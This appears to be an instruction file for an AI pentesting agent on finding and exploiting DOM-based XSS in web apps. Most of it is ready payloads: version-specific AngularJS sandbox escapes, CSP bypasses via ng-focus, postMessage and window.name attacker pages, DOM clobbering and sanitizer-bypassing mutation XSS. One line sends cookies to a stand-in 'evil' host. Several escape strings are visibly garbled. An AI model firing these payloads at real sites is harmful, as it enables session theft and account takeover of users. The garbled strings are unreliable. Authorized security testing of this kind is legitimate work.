---
name: dom-xss
description: DOM-based XSS testing covering source/sink analysis, client-side template injection (CSTI), AngularJS expression injection, postMessage exploitation, DOM clobbering, and browser-based detection techniques
---

# DOM-Based XSS — Expert-Level Testing

DOM XSS occurs entirely in the browser — user-controlled input flows from a JavaScript source into a dangerous sink without server-side reflection. Standard curl-based testing CANNOT detect it. You MUST use browser-based testing.

## Step 1: Detect DOM XSS Sources in Page

```bash
# Download all JS files and search for DOM XSS sources
curl -sk "https://TARGET/" | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | while read js; do
  echo "=== $js ==="
  curl -sk "https://TARGET/$js" 2>/dev/null | grep -nE "location\.(hash|search|href|pathname)|document\.(referrer|URL|documentURI)|window\.name|postMessage|localStorage|sessionStorage" | head -20
done

# Check page source for common DOM XSS patterns
curl -sk "https://TARGET/" | grep -nE "innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|setTimeout\(|setInterval\(|Function\(|\\.html\(|\\$\("

# Check for framework-specific sinks
curl -sk "https://TARGET/" | grep -nE "ng-app|ng-bind-html|v-html|dangerouslySetInnerHTML|\{@html|ng-bind-html-unsafe"
```

## Step 2: Identify Client-Side Framework

```bash
# Detect AngularJS (MOST IMPORTANT for expert-level exploitation)
curl -sk "https://TARGET/" | grep -oP 'angular[^"]*\.js[^"]*'
curl -sk "https://TARGET/" | grep -cE 'ng-app|ng-controller|ng-model|ng-bind'

# Check Angular version
curl -sk "https://TARGET/" | grep -oP 'angular[.\w]*\.js' | head -1
# Or in browser console: angular.version

# Detect Vue.js
curl -sk "https://TARGET/" | grep -cE 'v-html|v-bind|v-model|vue\.js|vue\.min\.js'

# Detect jQuery (version matters for selector injection)
curl -sk "https://TARGET/" | grep -oP 'jquery[^"]*\.js[^"]*'
```

## Step 3: Client-Side Template Injection (CSTI)

### AngularJS Expression Injection — Detection

```bash
# Quick test — if {{7*7}} returns 49, expression injection exists
curl -sk "https://TARGET/search?q={{7*7}}" | grep "49"

# Alternative syntax detection
curl -sk "https://TARGET/search?q={{constructor}}" | grep -v "{{constructor}}"
curl -sk "https://TARGET/search?q={{toString()}}" | grep "\[object"
```

### AngularJS Expression → Code Execution (By Version)

```bash
# AngularJS 1.0.x - 1.1.x (NO sandbox)
curl -sk "https://TARGET/?q={{constructor.constructor('alert(1)')()}}"

# AngularJS 1.2.0 - 1.2.18
curl -sk "https://TARGET/?q={{a]='alert(1)'}}{{a.constructor.prototype.charAt=[].join;a|orderBy:'x]|[x'}}"

# AngularJS 1.2.19 - 1.2.23
curl -sk "https://TARGET/?q={{'a'.constructor.prototype.charAt=[].join;\$eval('x=alert(1)');}}"

# AngularJS 1.2.24 - 1.2.29
curl -sk "https://TARGET/?q={{'a'.constructor.prototype.charAt=[].join;\$eval('x=1}};alert(1)//');}}}"

# AngularJS 1.3.0
curl -sk "https://TARGET/?q={{!ready&&(ready=true)&&(!!constructor.defineProperty(this,'__proto__',{value:{charAt:[].join,indexOf:[].indexOf,charCodeAt:[].concat},writable:true,configurable:true}))&&(x]||(x]=1,alert(1)))&&(a]='1')}}"

# AngularJS 1.3.1 - 1.3.2
curl -sk "https://TARGET/?q={{a]='x]=%27.teleport(x.document.location.href]=%27http://evil/?%27+document.cookie)';b=c.constructor.prototype;b.charAt=b.trim;\$eval(a])}}"

# AngularJS 1.3.3 - 1.3.18
curl -sk "https://TARGET/?q={{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]'.constructor.prototype.charAt=''.valueOf;\$eval('x=alert(1)//');}}}"

# AngularJS 1.3.19 - 1.3.20 (WITHOUT STRINGS!)
curl -sk "https://TARGET/?q={{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}"

# AngularJS 1.4.0 - 1.4.9
curl -sk "https://TARGET/?q={{'a'.constructor.prototype.charAt=[].join;\$eval('x=alert⑴');}}"

# AngularJS 1.5.0 - 1.5.7
curl -sk "https://TARGET/?q={{x=valueOf.call;x(alert,1)}}"

# AngularJS 1.5.8 - 1.5.11
curl -sk "https://TARGET/?q={{a]constructor.prototype.charAt=[].join;\$eval('x=alert(1)');}}"

# AngularJS 1.6+ (sandbox REMOVED — direct access)
curl -sk "https://TARGET/?q={{constructor.constructor('alert(1)')()}}"
curl -sk "https://TARGET/?q={{\$on.constructor('alert(1)')()}}"
```

### AngularJS Expression Injection WITHOUT Strings (Expert Technique)

When WAF or CSP blocks string literals (quotes):

```bash
# Using fromCharCode — no quotes needed at all
curl -sk "https://TARGET/?q={{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}"

# Using array map + fromCharCode
curl -sk "https://TARGET/?q={{\$on.constructor([97,108,101,114,116,40,49,41].map(function(x){return String.fromCharCode(x)}).join([]))()}}"

# For 1.6+ without strings
curl -sk "https://TARGET/?q={{\$on.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}"
```

### AngularJS + CSP Bypass (Expert Combination)

When both AngularJS and CSP are present:

```bash
# KEY INSIGHT: AngularJS event directives (ng-focus, ng-click) bypass CSP because
# Angular evaluates expressions internally, NOT as inline JS

# Auto-triggering (no user interaction required):
curl -sk "https://TARGET/?q=<input autofocus ng-focus=\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>"

# With tabindex for div elements
curl -sk "https://TARGET/?q=<div tabindex=0 ng-focus=\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>click</div>"

# Using ng-app+ng-csp attributes in injected element
curl -sk "https://TARGET/?q=<div ng-app ng-csp><input autofocus ng-focus=\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'></div>"

# Alternative: using $event.view 
curl -sk "https://TARGET/?q=<input autofocus ng-focus=\$event.view.alert(1)>"

# Using $event.path (older browsers)
curl -sk "https://TARGET/?q=<input autofocus ng-focus=\$event.path|orderBy:'[].constructor.from([1],alert)'>"

# ng-click version (requires user click)
curl -sk "https://TARGET/?q=<button ng-click=\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>click me</button>"
```

### Vue.js Template Injection

```bash
# Vue 2 with client-side template compilation
curl -sk "https://TARGET/?q={{constructor.constructor('alert(1)')()}}"
curl -sk "https://TARGET/?q={{_c.constructor('alert(1)')()}}"

# Vue 3 (v-html if user input reaches it)
curl -sk "https://TARGET/?q=<img src=x onerror=alert(1)>"
```

## Step 4: DOM Sources → Sink Analysis

### URL Fragment (Hash) Based

```bash
# Test in browser — hash is NEVER sent to server, so WAFs can't inspect it
# Navigate to:
https://TARGET/page#<img src=x onerror=alert(1)>
https://TARGET/page#"><script>alert(1)</script>
https://TARGET/page#javascript:alert(1)

# If AngularJS is present:
https://TARGET/page#{{constructor.constructor('alert(1)')()}}
```

### Query Parameter Based

```bash
# JavaScript reads location.search and writes to DOM
curl -sk "https://TARGET/page?search=<img+src=x+onerror=alert(1)>" | grep "onerror"
# Note: Even if NOT reflected in source, JS may process it client-side
# MUST test in actual browser
```

### postMessage Based

```html
<!-- Host this HTML on attacker server, open in browser -->
<iframe src="https://TARGET/page" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    // Test if target accepts messages without origin check
    this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    this.contentWindow.postMessage('{"type":"update","html":"<img src=x onerror=alert(1)>"}', '*');
    this.contentWindow.postMessage('javascript:alert(1)', '*');
  };
</script>
```

### window.name Based

```html
<!-- Attacker page: set window.name, then redirect to target -->
<script>
  window.name = '<img src=x onerror=alert(document.domain)>';
  location = 'https://TARGET/vulnerable-page';
</script>
<!-- If target reads window.name into innerHTML → XSS -->
```

### DOM Clobbering

```html
<!-- Clobber JavaScript variables via HTML elements with id/name -->
<!-- If target code does: if(window.config) { url = config.url; } -->
<a id="config" href="javascript:alert(1)">
<form id="config"><input name="url" value="javascript:alert(1)"></form>

<!-- Two-level clobbering with form+input -->
<form id="config"><input name="url" value="javascript:alert(1)"></form>
<!-- Now window.config.url === "javascript:alert(1)" -->

<!-- Clobber security checks -->
<img id="isAdmin" src="x">
<!-- window.isAdmin is now truthy → bypasses auth checks -->
```

## Step 5: Advanced DOM XSS Techniques

### jQuery Selector Injection

```bash
# jQuery $() creates elements from HTML strings starting with <
# If code does: $(location.hash.slice(1))
https://TARGET/page#<img/src/onerror=alert(1)>

# jQuery < 3.5 is vulnerable even without leading <
https://TARGET/page?param=<img src=x onerror=alert(1)>
# If code does: $(userInput)
```

### Mutation XSS (mXSS) — Bypasses DOMPurify

```html
<!-- These exploit browser HTML parser mutations -->
<!-- DOMPurify sanitizes HTML, but browser re-parses differently than DOMPurify's parser -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<math><mtext><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style></svg>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

### Automated DOM Source/Sink Discovery (Browser Console)

```javascript
// Paste in browser DevTools console to intercept and log DOM XSS sinks
(function() {
  const origWrite = document.write;
  document.write = function(x) {
    console.trace('[DOM XSS SINK] document.write:', x.substring(0, 200));
    return origWrite.apply(this, arguments);
  };

  const origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
  Object.defineProperty(Element.prototype, 'innerHTML', {
    set: function(val) {
      if (val && typeof val === 'string' && (val.includes('<') || val.includes('javascript:'))) {
        console.trace('[DOM XSS SINK] innerHTML:', val.substring(0, 200));
      }
      return origInnerHTML.set.call(this, val);
    },
    get: origInnerHTML.get
  });

  const origEval = window.eval;
  window.eval = function(x) {
    console.trace('[DOM XSS SINK] eval:', String(x).substring(0, 200));
    return origEval.apply(this, arguments);
  };
})();
```

### Source Map Analysis

```bash
# Download and analyze source maps for client-side code
curl -sk "https://TARGET/static/main.js" | grep -oP '//# sourceMappingURL=\K.*'
curl -sk "https://TARGET/static/main.js.map" | python3 -m json.tool | grep -iE "innerHTML|eval|document.write|postMessage|location.hash"
```

## Testing Methodology

1. **Detect framework** — Check for AngularJS (ng-app), Vue (v-html), React, jQuery in page source
2. **If AngularJS found** — Immediately test `{{7*7}}` in every parameter and URL fragment
3. **Download all JS** — Search for source→sink flows (location.hash → innerHTML, etc.)
4. **Map entry points** — Which URL params/hash/postMessage/storage values feed into JS?
5. **Test dynamically** — Open in browser, inject payloads via hash (bypasses WAF)
6. **Test postMessage** — Look for `addEventListener('message')` handlers without origin checks
7. **Test DOM clobbering** — If HTML injection exists but scripts blocked, try clobbering JS variables
8. **Test mXSS** — If DOMPurify/sanitizer present, use math/svg mutation payloads
9. **Use browser DevTools** — Network tab for requests, Console for sink hooks, Sources for debugging

## Validation

1. JavaScript executes in browser from attacker-controlled source (hash, postMessage, referrer)
2. Source → sink data flow confirmed in JavaScript source code
3. Payload works in fresh browser session without prior state
4. postMessage handler accepts messages from any origin (no origin validation)

## Impact

- Account takeover via cookie/token theft
- Keylogging and credential harvesting
- Persistent compromise via service worker injection
- Wormable XSS in social platforms (self-propagating payloads)

## Pro Tips

1. **curl CANNOT find DOM XSS** — you MUST test in a browser or analyze JavaScript source
2. **Hash fragments bypass WAFs** — `location.hash` is never sent to server
3. **AngularJS + CSP** — use `ng-focus` with `$event.composedPath()` — this is THE expert-level technique
4. **postMessage without origin check** — extremely common and high-impact
5. **jQuery $()** — creates elements from HTML strings, major DOM XSS sink
6. **Source maps (.js.map)** — reveal original source code, search for sinks in readable format
7. **window.name** — persists across navigations, powerful source that survives redirects
8. **DOM clobbering** — bypasses `if (window.someVar)` checks to inject values
9. **mXSS** — bypasses ALL sanitizers including DOMPurify, use nested math/svg/style tags
10. **Always test with browser** — use `browser_action` tool's `evaluate_js` to test DOM XSS in real browser
